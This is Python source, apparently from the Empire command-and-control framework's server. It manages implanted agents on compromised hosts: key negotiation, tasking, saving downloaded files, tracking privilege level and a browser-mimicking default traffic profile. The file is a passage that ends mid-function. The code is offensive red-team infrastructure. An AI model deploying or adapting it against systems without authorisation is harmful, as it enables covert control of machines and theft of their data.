"""

Main agent handling functionality for Empire.

The Agents() class in instantiated in ./server.py by the main menu and includes:

    get_db_connection()         - returns the server.py:mainMenu database connection object
    is_agent_present()          - returns True if an agent is present in the self.agents cache
    add_agent()                 - adds an agent to the self.agents cache and the backend database
    remove_agent_db()           - removes an agent from the self.agents cache and the backend database
    is_ip_allowed()             - checks if a supplied IP is allowed as per the whitelist/blacklist
    save_file()                 - saves a file download for an agent to the appropriately constructed path.
    save_module_file()          - saves a module output file to the appropriate path
    save_agent_log()            - saves the agent console output to the agent's log file
    is_agent_elevated()         - checks whether a specific sessionID is currently elevated
    get_agents_db()             - returns all active agents from the database
    get_agent_names_db()        - returns all names of active agents from the database
    get_agent_ids_db()          - returns all IDs of active agents from the database
    get_agent_db()              - returns complete information for the specified agent from the database
    get_agent_nonce_db()        - returns the nonce for this sessionID
    get_language_db()           - returns the language used by this agent
    get_language_version_db()   - returns the language version used by this agent
    get_agent_session_key_db()  - returns the AES session key from the database for a sessionID
    get_agent_results_db()      - returns agent results from the backend database
    get_agent_id_db()           - returns an agent sessionID based on the name
    get_agent_name_db()         - returns an agent name based on sessionID
    get_agent_hostname_db()     - returns an agent's hostname based on sessionID
    get_agent_os_db()           - returns an agent's operating system details based on sessionID
    get_agent_functions()       - returns the tab-completable functions for an agent from the cache
    get_agent_functions_db()    - returns the tab-completable functions for an agent from the database
    get_agents_for_listener()   - returns all agent objects linked to a given listener name
    get_agent_names_listener_db()-returns all agent names linked to a given listener name
    get_autoruns_db()           - returns any global script autoruns
    update_agent_sysinfo_db()   - updates agent system information in the database
    update_agent_lastseen_db()  - updates the agent's last seen timestamp in the database
    update_agent_listener_db()  - updates the agent's listener name in the database
    rename_agent()              - renames an agent
    set_agent_functions_db()    - sets the tab-completable functions for the agent in the database
    set_autoruns_db()           - sets the global script autorun in the config in the database
    clear_autoruns_db()         - clears the currently set global script autoruns in the config in the database
    add_agent_task_db()         - adds a task to the specified agent's buffer in the database
    get_agent_tasks_db()        - retrieves tasks for our agent from the database
    get_agent_tasks_listener_db()- retrieves tasks for our agent from the database keyed by listener name
    clear_agent_tasks_db()      - clear out one (or all) agent tasks in the database
    handle_agent_staging()      - handles agent staging neogotiation
    handle_agent_data()         - takes raw agent data and processes it appropriately.
    handle_agent_request()      - return any encrypted tasks for the particular agent
    handle_agent_response()     - parses agent raw replies into structures
    process_agent_packet()      - processes agent reply structures appropriately

handle_agent_data() is the main function that should be used by external listener modules

Most methods utilize self.lock to deal with the concurreny issue of kicking off threaded listeners.

"""
from __future__ import absolute_import
from __future__ import print_function

import base64
import sqlite3
import json
import os
import string
import threading
from builtins import object
# -*- encoding: utf-8 -*-
from builtins import str
from datetime import datetime, timezone

from pydispatch import dispatcher
from zlib_wrapper import decompress

# Empire imports
from empire.server.database.models import TaskingStatus
from . import encryption
from . import events
from . import helpers
from . import messages
from . import packets
from empire.server.database.base import Session
from empire.server.database import models
from empire.server.common.hooks import hooks
from sqlalchemy import or_, func, and_, update


class Agents(object):
    """
    Main class that contains agent handling functionality, including key
    negotiation in process_get() and process_post().
    """

    def __init__(self, MainMenu, args=None):

        # pull out the controller objects
        self.mainMenu = MainMenu
        self.installPath = self.mainMenu.installPath
        self.args = args

        # internal agent dictionary for the client's session key, funcions, and URI sets
        #   this is done to prevent database reads for extremely common tasks (like checking tasking URI existence)
        #   self.agents[sessionID] = {  'sessionKey' : clientSessionKey,
        #                               'functions' : [tab-completable function names for a script-import]
        #                            }
        self.agents = {}

        # used to protect self.agents and self.mainMenu.conn during threaded listener access
        self.lock = threading.Lock()

        # reinitialize any agents that already exist in the database
        dbAgents = self.get_agents_db()
        for agent in dbAgents:
            agentInfo = {'sessionKey': agent['session_key'], 'functions': agent['functions']}
            self.agents[agent['session_id']] = agentInfo

        # pull out common configs from the main menu object in server.py
        self.ipWhiteList = self.mainMenu.ipWhiteList
        self.ipBlackList = self.mainMenu.ipBlackList

    ###############################################################
    #
    # Misc agent methods
    #
    ###############################################################

    @staticmethod
    def get_agent_from_name_or_session_id(agent_name):
        agent = Session().query(models.Agent).filter(or_(models.Agent.name == agent_name,
                                                         models.Agent.session_id == agent_name)).first()
        return agent

    def is_agent_present(self, sessionID):
        """
        Checks if a given sessionID corresponds to an active agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        return sessionID in self.agents

    def add_agent(self, sessionID, externalIP, delay, jitter, profile, killDate, workingHours, lostLimit,
                  sessionKey=None, nonce='', listener='', language=''):
        """
        Add an agent to the internal cache and database.
        """
        # generate a new key for this agent if one wasn't supplied
        if not sessionKey:
            sessionKey = encryption.generate_aes_key()

        if not profile or profile == '':
            profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

        # add the agent
        agent = models.Agent(name=sessionID,
                             session_id=sessionID,
                             delay=delay,
                             jitter=jitter,
                             external_ip=externalIP,
                             session_key=sessionKey,
                             nonce=nonce,
                             profile=profile,
                             kill_date=killDate,
                             working_hours=workingHours,
                             lost_limit=lostLimit,
                             listener=listener,
                             language=language,
                             killed=False
                             )
        Session().add(agent)
        Session().flush()
        Session().commit()

        hooks.run_hooks(hooks.AFTER_AGENT_CHECKIN_HOOK, agent)

        # dispatch this event
        message = "[*] New agent {} checked in".format(sessionID)
        signal = json.dumps({
            'print': True,
            'message': message,
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'event_type': 'checkin'
        })
        dispatcher.send(signal, sender="agents/{}".format(sessionID))

        # initialize the tasking/result buffers along with the client session key
        self.agents[sessionID] = {'sessionKey': sessionKey, 'functions': []}

    def get_agent_for_socket(self, session_id):
        agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()

        return {"ID": agent.id, "session_id": agent.session_id, "listener": agent.listener, "name": agent.name,
                "language": agent.language, "language_version": agent.language_version, "delay": agent.delay,
                "jitter": agent.jitter, "external_ip": agent.external_ip, "internal_ip": agent.internal_ip,
                "username": agent.username, "high_integrity": int(agent.high_integrity or 0),
                "process_name": agent.process_name,
                "process_id": agent.process_id, "hostname": agent.hostname, "os_details": agent.os_details,
                "session_key": str(agent.session_key),
                "nonce": agent.nonce, "checkin_time": agent.checkin_time,
                "lastseen_time": agent.lastseen_time, "parent": agent.parent, "children": agent.children,
                "servers": agent.servers, "profile": agent.profile, "functions": agent.functions,
                "kill_date": agent.kill_date, "working_hours": agent.working_hours,
                "lost_limit": agent.lost_limit}

    def remove_agent_db(self, session_id):
        """
        Remove an agent to the internal cache and database.
        """
        if session_id == '%' or session_id.lower() == 'all':
            session_id = '%'
            self.agents = {}
        else:
            # see if we were passed a name instead of an ID
            nameid = self.get_agent_id_db(session_id)
            if nameid:
                session_id = nameid

            # remove the agent from the internal cache
            self.agents.pop(session_id, None)

        # remove the agent from the database
        agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()
        if agent:
            Session().delete(agent)
            Session().commit()

        # dispatch this event
        message = "[*] Agent {} deleted".format(session_id)
        signal = json.dumps({
            'print': True,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(session_id))

    def is_ip_allowed(self, ip_address):
        """
        Check if the ip_address meshes with the whitelist/blacklist, if set.
        """
        if self.ipBlackList:
            if self.ipWhiteList:
                results = ip_address in self.ipWhiteList and ip_address not in self.ipBlackList
                return results
            else:
                results = ip_address not in self.ipBlackList
                return results
        if self.ipWhiteList:
            results = ip_address in self.ipWhiteList
            return results
        else:
            return True

    def save_file(self, sessionID, path, data, filesize, append=False):
        """
        Save a file download for an agent to the appropriately constructed path.
        """
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        lang = self.get_language_db(sessionID)
        parts = path.split("\\")

        # construct the appropriate save path
        save_path = "%s/downloads/%s/%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
        filename = os.path.basename(parts[-1])

        try:
            self.lock.acquire()
            # fix for 'skywalker' exploit by @zeroSteiner
            safePath = os.path.abspath("%s/downloads/" % self.installPath)
            if not os.path.abspath(save_path + "/" + filename).startswith(safePath):
                message = "[!] WARNING: agent {} attempted skywalker exploit!\n[!] attempted overwrite of {} with data {}".format(
                    sessionID, path, data)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                return

            # make the recursive directory structure if it doesn't already exist
            if not os.path.exists(save_path):
                os.makedirs(save_path)

            # overwrite an existing file
            if not append:
                f = open("%s/%s" % (save_path, filename), 'wb')
            else:
                # otherwise append
                f = open("%s/%s" % (save_path, filename), 'ab')

            if "python" in lang:
                print(
                    helpers.color("[*] Compressed size of %s download: %s" % (filename, helpers.get_file_size(data)),
                                  color="green"))
                d = decompress.decompress()
                dec_data = d.dec_data(data)
                print(helpers.color(
                    "[*] Final size of %s wrote: %s" % (filename, helpers.get_file_size(dec_data['data'])),
                    color="green"))
                if not dec_data['crc32_check']:
                    message = "[!] WARNING: File agent {} failed crc32 check during decompression!\n[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!".format(
                        nameid, dec_data['header_crc32'], dec_data['dec_crc32'], dec_data['crc32_check'])
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(nameid))
                data = dec_data['data']

            f.write(data)
            f.close()
        finally:
            self.lock.release()

        percent = round(int(os.path.getsize("%s/%s" % (save_path, filename))) / int(filesize) * 100, 2)

        # notify everyone that the file was downloaded
        message = "[+] Part of file {} from {} saved [{}%] to {}".format(filename, sessionID, percent, save_path)
        signal = json.dumps({
            'print': True,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(sessionID))

    def save_module_file(self, sessionID, path, data):
        """
        Save a module output file to the appropriate path.
        """

        sessionID = self.get_agent_name_db(sessionID)
        lang = self.get_language_db(sessionID)
        parts = path.split("/")

        # construct the appropriate save path
        save_path = "%s/downloads/%s/%s" % (self.installPath, sessionID, "/".join(parts[0:-1]))
        filename = parts[-1]

        # decompress data if coming from a python agent:
        if "python" in lang:
            print(helpers.color("[*] Compressed size of %s download: %s" % (filename, helpers.get_file_size(data)),
                                color="green"))
            d = decompress.decompress()
            dec_data = d.dec_data(data)
            print(helpers.color("[*] Final size of %s wrote: %s" % (filename, helpers.get_file_size(dec_data['data'])),
                                color="green"))
            if not dec_data['crc32_check']:
                message = "[!] WARNING: File agent {} failed crc32 check during decompression!\n[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!".format(
                    sessionID, dec_data['header_crc32'], dec_data['dec_crc32'], dec_data['crc32_check'])
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
            data = dec_data['data']

        try:
            self.lock.acquire()
            # fix for 'skywalker' exploit by @zeroSteiner
            safePath = os.path.abspath("%s/downloads/" % self.installPath)
            if not os.path.abspath(save_path + "/" + filename).startswith(safePath):
                message = "[!] WARNING: agent {} attempted skywalker exploit!\n[!] attempted overwrite of {} with data {}".format(
                    sessionID, path, data)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                return

            # make the recursive directory structure if it doesn't already exist
            if not os.path.exists(save_path):
                os.makedirs(save_path)

            # save the file out
            with open("%s/%s" % (save_path, filename), 'wb') as f:
                f.write(data)
        finally:
            self.lock.release()

        # notify everyone that the file was downloaded
        message = "[+] File {} from {} saved".format(path, sessionID)
        signal = json.dumps({
            'print': True,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(sessionID))

        return "/downloads/%s/%s/%s" % (sessionID, "/".join(parts[0:-1]), filename)

    def save_agent_log(self, sessionID, data):
        """
        Save the agent console output to the agent's log file.
        """
        if isinstance(data, bytes):
            data = data.decode('UTF-8')
        name = self.get_agent_name_db(sessionID)
        save_path = self.installPath + "/downloads/" + str(name) + "/"

        # make the recursive directory structure if it doesn't already exist
        if not os.path.exists(save_path):
            os.makedirs(save_path)

        current_time = helpers.get_datetime()

        try:
            self.lock.acquire()

            with open("%s/agent.log" % (save_path), 'a') as f:
                f.write("\n" + current_time + " : " + "\n")
                f.write(data + "\n")
        finally:

            self.lock.release()

    ###############################################################
    #
    # Methods to get information from agent fields.
    #
    ###############################################################

    def is_agent_elevated(self, session_id):
        """
        Check whether a specific sessionID is currently elevated.
        This means root for OS X/Linux and high integrity for Windows.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(session_id)
        if nameid:
            session_id = nameid

        elevated = Session().query(models.Agent.high_integrity).filter(models.Agent.session_id == session_id).scalar()

        return elevated is True

    def get_agents_db(self):
        """
        Return all active agents from the database.
        """
        results = Session().query(models.Agent).all()

        return results

    def get_agent_names_db(self):
        """
        Return all names of active agents from the database.
        """
        results = Session().query(models.Agent.name).all()

        # make sure names all ascii encoded
        results = [r[0].encode('ascii', 'ignore') for r in results]
        return results

    def get_agent_ids_db(self):
        """
        Return all IDs of active agents from the database.
        """
        results = Session().query(models.Agent.session_id).all()

        # make sure names all ascii encoded
        results = [str(r[0]).encode('ascii', 'ignore') for r in results if r]
        return results

    def get_agent_db(self, session_id):
        """
        Return complete information for the specified agent from the database.
        """
        agent = Session().query(models.Agent).filter(or_(models.Agent.session_id == session_id,
                                                         models.Agent.name == session_id)).first()

        return agent

    def get_agent_nonce_db(self, session_id):
        """
        Return the nonce for this sessionID.
        """

        nonce = Session().query(models.Agent.nonce).filter(models.Agent.session_id == session_id).first()

        if nonce and nonce is not None:
            if type(nonce) is str:
                return nonce
            else:
                return nonce[0]

    def get_language_db(self, session_id):
        """
        Return the language used by this agent.
        """
        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        language = Session().query(models.Agent.language).filter(models.Agent.session_id == session_id).scalar()

        return language

    def get_language_version_db(self, session_id):
        """
        Return the language version used by this agent.
        """
        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        language_version = Session().query(models.Agent.language_version).filter(
            models.Agent.session_id == session_id).scalar()

        return language_version

    def get_agent_session_key_db(self, session_id):
        """
        Return AES session key from the database for this sessionID.
        """

        agent = Session().query(models.Agent).filter(
            or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent is not None:
            return agent.session_key

    def get_agent_id_db(self, name):
        """
        Get an agent sessionID based on the name.
        """

        agent = Session().query(models.Agent).filter((models.Agent.name == name)).first()

        if agent:
            return agent.session_id
        else:
            return None

    def get_agent_name_db(self, session_id):
        """
        Return an agent name based on sessionID.
        """
        agent = Session().query(models.Agent).filter(
            or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent:
            return agent.name
        else:
            return None

    def get_agent_hostname_db(self, session_id):
        """
        Return an agent's hostname based on sessionID.
        """
        agent = Session().query(models.Agent).filter(
            or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent:
            return agent.hostname
        else:
            return None

    def get_agent_os_db(self, session_id):
        """
        Return an agent's operating system details based on sessionID.
        """
        agent = Session().query(models.Agent).filter(
            or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent:
            return agent.os_details
        else:
            return None

    def get_agent_functions(self, session_id):
        """
        Get the tab-completable functions for an agent.
        """

        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        results = []

        if session_id in self.agents:
            results = self.agents[session_id]['functions']

        return results

    def get_agent_functions_db(self, session_id):
        """
        Return the tab-completable functions for an agent from the database.
        """
        agent = Session().query(models.Agent).filter(
            or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()

        if agent.functions is not None:
            return agent.functions.split(',')
        else:
            return []

    def get_agents_for_listener(self, listener_name):
        """
        Return agent objects linked to a given listener name.
        """
        agents = Session().query(models.Agent.session_id).filter(models.Agent.listener == listener_name).all()

        if agents:
            # make sure names all ascii encoded
            results = [r[0].encode('ascii', 'ignore') for r in agents]
        else:
            results = []

        return results

    def get_agent_names_listener_db(self, listener_name):
        """
        Return agent names linked to the given listener name.
        """

        agents = Session().query(models.Agent).filter(models.Agent.listener == listener_name).all()

        return agents

    def get_autoruns_db(self):
        """
        Return any global script autoruns.
        """
        results = Session().query(models.Config.autorun_command).all()
        if results[0].autorun_command:
            autorun_command = results[0].autorun_command
        else:
            autorun_command = ''

        results = Session().query(models.Config.autorun_data).all()
        if results[0].autorun_data:
            autorun_data = results[0].autorun_data
        else:
            autorun_data = ''

        autoruns = [autorun_command, autorun_data]

        return autoruns

    ###############################################################
    #
    # Methods to update agent information fields.
    #
    ###############################################################
    def update_dir_list(self, session_id, response):
        """"
        Update the directory list
        """
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        if session_id in self.agents:
            # get existing files/dir that are in this directory.
            # delete them and their children to keep everything up to date. There's a cascading delete on the table.
            this_directory = Session().query(models.AgentFile).filter(and_(
                models.AgentFile.session_id == session_id),
                models.AgentFile.path == response['directory_path']).first()
            if this_directory:
                Session().query(models.AgentFile).filter(and_(
                    models.AgentFile.session_id == session_id,
                    models.AgentFile.parent_id == this_directory.id)).delete()
            else:  # if the directory doesn't exist we have to create one
                # parent is None for now even though it might have one. This is self correcting.
                # If it's true parent is scraped, then this entry will get rewritten
                this_directory = models.AgentFile(
                    name=response['directory_name'],
                    path=response['directory_path'],
                    parent_id=None,
                    is_file=False,
                    session_id=session_id
                )
                Session().add(this_directory)
                Session().flush()

            for item in response['items']:
                Session().query(models.AgentFile).filter(and_(
                    models.AgentFile.session_id == session_id,
                    models.AgentFile.path == item['path'])).delete()
                Session().add(models.AgentFile(
                    name=item['name'],
                    path=item['path'],
                    parent_id=None if not this_directory else this_directory.id,
                    is_file=item['is_file'],
                    session_id=session_id))

            Session().commit()

    def update_agent_sysinfo_db(self, session_id, listener='', external_ip='', internal_ip='', username='', hostname='',
                                os_details='', high_integrity=0, process_name='', process_id='', language_version='',
                                language='', architecture=''):
        """
        Update an agent's system information.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(session_id)
        if nameid:
            session_id = nameid

        agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()

        host = Session().query(models.Host).filter(and_(models.Host.name == hostname,
                                                        models.Host.internal_ip == internal_ip)).first()
        if not host:
            host = models.Host(name=hostname, internal_ip=internal_ip)
            Session().add(host)
            Session().flush()

        process = Session().query(models.HostProcess).filter(and_(models.HostProcess.host_id == host.id,
                                                                  models.HostProcess.process_id == process_id)).first()
        if not process:
            process = models.HostProcess(host_id=host.id,
                                         process_id=process_id,
                                         process_name=process_name,
                                         user=agent.username)
            Session().add(process)
            Session().flush()

        agent.internal_ip = internal_ip.split(" ")[0]
        agent.username = username
        agent.hostname = hostname
        agent.host_id = host.id
        agent.os_details = os_details
        agent.high_integrity = high_integrity
        agent.process_name = process_name
        agent.process_id = process_id
        agent.language_version = language_version
        agent.language = language
        agent.architecture = architecture

        Session().commit()

    def update_agent_lastseen_db(self, session_id, current_time=None):
        """
        Update the agent's last seen timestamp in the database.
        """
        Session().execute(update(models.Agent) \
                          .where(or_(models.Agent.session_id == session_id, models.Agent.name == session_id)))
        Session.commit()

    def update_agent_listener_db(self, session_id, listener_name):
        """
        Update the specified agent's linked listener name in the database.
        """

        agent = Session().query(models.Agent).filter(
            or_(models.Agent.session_id == session_id, models.Agent.name == session_id)).first()
        agent.listener = listener_name
        Session.commit()

    def rename_agent(self, old_name, new_name):
        """
        Rename a given agent from 'oldname' to 'newname'.
        """

        if not new_name.isalnum():
            print(helpers.color("[!] Only alphanumeric characters allowed for names."))
            return False

        # rename the logging/downloads folder
        old_path = "%s/downloads/%s/" % (self.installPath, old_name)
        new_path = "%s/downloads/%s/" % (self.installPath, new_name)
        ret_val = True

        # check if the folder is already used
        if os.path.exists(new_path):
            print(helpers.color("[!] Name already used by current or past agent."))
            ret_val = False
        else:
            # move the old folder path to the new one
            if os.path.exists(old_path):
                os.rename(old_path, new_path)

            # rename the agent in the database
            agent = Session().query(models.Agent).filter(models.Agent.name == old_name).first()
            agent.name = new_name

            # change tasking and results to new agent
            # maybe not needed
            # taskings = Session().query(models.Tasking).filter(models.Tasking.agent == old_name).all()
            # results = Session().query(models.Result).filter(models.Result.agent == old_name).all()
            #
            # if taskings:
            #     for x in range(len(taskings)):
            #         taskings[x].agent = new_name
            #
            # if results:
            #     for x in range(len(results)):
            #         results[x].agent = new_name

            Session.commit()
            ret_val = True

        # signal in the log that we've renamed the agent
        self.save_agent_log(old_name, "[*] Agent renamed from %s to %s" % (old_name, new_name))

        return ret_val

    def set_agent_functions_db(self, session_id, functions):
        """
        Set the tab-completable functions for the agent in the database.
        """

        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        if session_id in self.agents:
            self.agents[session_id]['functions'] = functions

        functions = ','.join(functions)

        agent = Session().query(models.Agent).filter(models.Agent.session_id == session_id).first()
        agent.functions = functions
        Session.commit()

    def set_autoruns_db(self, task_command, module_data):
        """
        Set the global script autorun in the config in the database.
        """
        try:
            config = Session().query(models.Config).first()
            config.autorun_command = task_command
            config.autorun_data = module_data
            Session().commit()
        except Exception:
            print(helpers.color(
                "[!] Error: script autoruns not a database field, run --reset to reset DB schema."))
            print(helpers.color("[!] Warning: this will reset ALL agent connections!"))

    def clear_autoruns_db(self):
        """
        Clear the currently set global script autoruns in the config in the database.
        """
        config = Session().query(models.Config).first()
        config.autorun_command = ''
        config.autorun_data = ''
        Session().commit()

    ###############################################################
    #
    # Agent tasking methods
    #
    ###############################################################

    def add_agent_task_db(self, session_id, task_name, task='', module_name=None, uid=1):
        """
        Add a task to the specified agent's buffer in the database.
        """
        agent_name = session_id
        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)

        if name_id:
            session_id = name_id

        if session_id not in self.agents:
            print(helpers.color("[!] Agent %s not active." % agent_name))
        else:
            if session_id:
                message = "[*] Tasked {} to run {}".format(session_id, task_name)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(session_id))

                pk = Session().query(func.max(models.Tasking.id)).filter(models.Tasking.agent_id == session_id).first()[0]

                if pk is None:
                    pk = 0
                pk = (pk + 1) % 65536

                Session().add(models.Tasking(id=pk,
                                             agent_id=session_id,
                                             input=task[:100],
                                             input_full=task,
                                             user_id=uid,
                                             module_name=module_name,
                                             task_name=task_name,
                                             status=TaskingStatus.queued))

                # update last seen time for user
                Session().execute(update(models.User).where(models.User.id == uid))
                Session.commit()

                try:
                    self.lock.acquire()

                    # dispatch this event
                    message = "[*] Agent {} tasked with task ID {}".format(session_id, pk)
                    signal = json.dumps({
                        'print': True,
                        'message': message,
                        'task_name': task_name,
                        'task_id': pk,
                        'task': task,
                        'event_type': 'task'
                    })
                    dispatcher.send(signal, sender="agents/{}".format(session_id))

                    # write out the last tasked script to "LastTask" if in debug mode
                    if self.args and self.args.debug:
                        with open('%s/LastTask' % (self.installPath), 'w') as f:
                            f.write(task)
                finally:
                    self.lock.release()

                return pk

    def get_agent_tasks_db(self, session_id):
        """
        Retrieve tasks that have been queued for our agent from the database.
        """

        agent_name = session_id

        # see if we were passed a name instead of an ID
        name_id = self.get_agent_id_db(session_id)
        if name_id:
            session_id = name_id

        if session_id not in self.agents:
            print(helpers.color("[!] Agent %s not active." % agent_name))
            return []
        else:
            tasks = Session().query(models.Tasking).filter(and_(models.Tasking.agent_id == session_id,
                                                                models.Tasking.status == TaskingStatus.queued)).all()
            for task in tasks:
                task.status = TaskingStatus.pulled

            Session().commit()
            return tasks

    def clear_agent_tasks_db(self, session_id):
        """
        Clear out queued agent tasks in the database.
        """
        self.get_agent_tasks_db(session_id)

        message = "[*] Tasked {} to clear tasks".format(session_id)
        signal = json.dumps({
            'print': True,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(session_id))

    ###############################################################
    #
    # Agent staging/data processing components
    #
    ###############################################################

    def handle_agent_staging(self, sessionID, language, meta, additional, encData, stagingKey, listenerOptions,
                             clientIP='0.0.0.0'):
        """
        Handles agent staging/key-negotiation.
        TODO: does this function need self.lock?
        """

        listenerName = listenerOptions['Name']['Value']

        if meta == 'STAGE0':
            # step 1 of negotiation -> client requests staging code
            return 'STAGE0'

        elif meta == 'STAGE1':
            # step 3 of negotiation -> client posts public key
            message = "[*] Agent {} from {} posted public key".format(sessionID, clientIP)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(sessionID))

            # decrypt the agent's public key
            try:
                message = encryption.aes_decrypt_and_verify(stagingKey, encData)
            except Exception as e:
                print('exception e:' + str(e))
                # if we have an error during decryption
                message = "[!] HMAC verification failed from '{}'".format(sessionID)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                return 'ERROR: HMAC verification failed'

            if language.lower() == 'powershell' or language.lower() == "csharp":
                # strip non-printable characters
                message = ''.join([x for x in message.decode('UTF-8') if x in string.printable])

                # client posts RSA key
                if (len(message) < 400) or (not message.endswith("</RSAKeyValue>")):
                    message = "[!] Invalid PowerShell key post format from {}".format(sessionID)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))
                    return 'ERROR: Invalid PowerShell key post format'
                else:
                    # convert the RSA key from the stupid PowerShell export format
                    rsaKey = encryption.rsa_xml_to_key(message)

                    if rsaKey:
                        message = "[*] Agent {} from {} posted valid PowerShell RSA key".format(sessionID, clientIP)
                        signal = json.dumps({
                            'print': False,
                            'message': message
                        })
                        dispatcher.send(signal, sender="agents/{}".format(sessionID))
                        nonce = helpers.random_string(16, charset=string.digits)
                        delay = listenerOptions['DefaultDelay']['Value']
                        jitter = listenerOptions['DefaultJitter']['Value']
                        profile = listenerOptions['DefaultProfile']['Value']
                        killDate = listenerOptions['KillDate']['Value']
                        workingHours = listenerOptions['WorkingHours']['Value']
                        lostLimit = listenerOptions['DefaultLostLimit']['Value']

                        # add the agent to the database now that it's "checked in"
                        self.mainMenu.agents.add_agent(sessionID, clientIP, delay, jitter, profile, killDate,
                                                       workingHours, lostLimit, nonce=nonce, listener=listenerName)

                        if self.mainMenu.socketio:
                            self.mainMenu.socketio.emit('agents/new', self.get_agent_for_socket(sessionID),
                                                        broadcast=True)

                        clientSessionKey = self.mainMenu.agents.get_agent_session_key_db(sessionID)
                        data = "%s%s" % (nonce, clientSessionKey)

                        data = data.encode('ascii', 'ignore')  # TODO: is this needed?

                        # step 4 of negotiation -> server returns RSA(nonce+AESsession))
                        encryptedMsg = encryption.rsa_encrypt(rsaKey, data)
                        # TODO: wrap this in a routing packet!

                        return encryptedMsg

                    else:
                        message = "[!] Agent {} returned an invalid PowerShell public key!".format(sessionID)
                        signal = json.dumps({
                            'print': True,
                            'message': message
                        })
                        dispatcher.send(signal, sender="agents/{}".format(sessionID))
                        return 'ERROR: Invalid PowerShell public key'

            elif language.lower() == 'python':
                if ((len(message) < 1000) or (len(message) > 2500)):
                    message = "[!] Invalid Python key post format from {}".format(sessionID)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))
                    return "Error: Invalid Python key post format from %s" % (sessionID)
                else:
                    try:
                        int(message)
                    except:
                        message = "[!] Invalid Python key post format from {}".format(sessionID)
                        signal = json.dumps({
                            'print': True,
                            'message': message
                        })
                        dispatcher.send(signal, sender="agents/{}".format(sessionID))
                        return "Error: Invalid Python key post format from {}".format(sessionID)

                    # client posts PUBc key
                    clientPub = int(message)
                    serverPub = encryption.DiffieHellman()
                    serverPub.genKey(clientPub)
                    # serverPub.key == the negotiated session key

                    nonce = helpers.random_string(16, charset=string.digits)

                    message = "[*] Agent {} from {} posted valid Python PUB key".format(sessionID, clientIP)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="agents/{}".format(sessionID))

                    delay = listenerOptions['DefaultDelay']['Value']
                    jitter = listenerOptions['DefaultJitter']['Value']
                    profile = listenerOptions['DefaultProfile']['Value']
                    killDate = listenerOptions['KillDate']['Value']
                    workingHours = listenerOptions['WorkingHours']['Value']
                    lostLimit = listenerOptions['DefaultLostLimit']['Value']

                    # add the agent to the database now that it's "checked in"
                    self.mainMenu.agents.add_agent(sessionID, clientIP, delay, jitter, profile, killDate, workingHours,
                                                   lostLimit, sessionKey=serverPub.key, nonce=nonce,
                                                   listener=listenerName)

                    if self.mainMenu.socketio:
                        self.mainMenu.socketio.emit('agents/new', self.get_agent_for_socket(sessionID),
                                                    broadcast=True)

                    # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
                    data = "%s%s" % (nonce, serverPub.publicKey)
                    encryptedMsg = encryption.aes_encrypt_then_hmac(stagingKey, data)
                    # TODO: wrap this in a routing packet?

                    return encryptedMsg

            else:
                message = "[*] Agent {} from {} using an invalid language specification: {}".format(sessionID, clientIP,
                                                                                                    language)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(sessionID))
                return 'ERROR: invalid language: {}'.format(language)

        elif meta == 'STAGE2':
            # step 5 of negotiation -> client posts nonce+sysinfo and requests agent

            sessionKey = (self.agents[sessionID]['sessionKey'])
            if isinstance(sessionKey, str):
                sessionKey = (self.agents[sessionID]['sessionKey']).encode('UTF-8')

            try:
                message = encryption.aes_decrypt_and_verify(sessionKey, encData)
                parts = message.split(b'|')

                if len(parts) < 12:
                    message = "[!] Agent {} posted invalid sysinfo checkin format: {}".format(sessionID, message)
                    signal = json.dumps({
